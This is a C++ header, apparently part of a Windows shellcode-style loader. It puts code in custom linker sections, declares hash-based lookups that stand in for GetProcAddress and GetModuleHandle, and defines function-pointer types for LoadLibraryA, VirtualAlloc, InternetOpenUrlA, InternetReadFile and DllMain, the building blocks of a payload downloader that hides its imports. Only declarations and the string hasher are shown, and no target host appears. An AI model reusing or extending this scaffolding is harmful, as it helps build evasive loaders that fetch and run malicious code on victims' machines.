#pragma once
#include <windows.h>
#include <stdint.h>
#include <stddef.h>
#define FUNC __attribute__((section(".func"),used))
#define FUNC_STR  __attribute__((section(".DEAD"),used))


FUNC void* XgetProcAddress(void* moduleBase, DWORD64 Hash);
FUNC HMODULE xGetModuleHandle(DWORD64 HASH);

// --- Types

typedef unsigned long       DWORD;
typedef void* HANDLE;
typedef const char* LPCSTR;
typedef void* LPVOID;
typedef unsigned long long  ULONG_PTR;
typedef ULONG_PTR           DWORD_PTR;
typedef int                 BOOL;
typedef unsigned long       ULONG;
typedef unsigned int        UINT;
typedef HANDLE              HINTERNET;

typedef HMODULE(WINAPI* pLoadLibraryA)(LPCSTR);
typedef FARPROC(WINAPI* pGetProcAddress)(HMODULE, LPCSTR);
typedef LPVOID(WINAPI* pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef HINTERNET(WINAPI* pInternetOpenA)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD);
typedef HINTERNET(WINAPI* pInternetOpenUrlA)(HINTERNET, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR);
typedef BOOL(WINAPI* pInternetReadFile)(HINTERNET, LPVOID, DWORD, LPDWORD);
typedef BOOL(WINAPI* pInternetCloseHandle)(HINTERNET);
typedef VOID(WINAPI* pExitProcess)(UINT);
typedef void* (__stdcall* fnGetModuleHandleA)(const char*);
typedef BOOL(WINAPI* pDllMain)(HINSTANCE, DWORD, LPVOID);





template<typename T>
constexpr uint64_t hash_strings(T const* strings_to_hash) {
    unsigned long hash = 0xA28;
    int c = 0;

    while ((c = static_cast<int>(*strings_to_hash++)))
        hash = ((hash << 5) + hash) + c;

    return hash;
}

#define HASH(x) hash_strings(x)


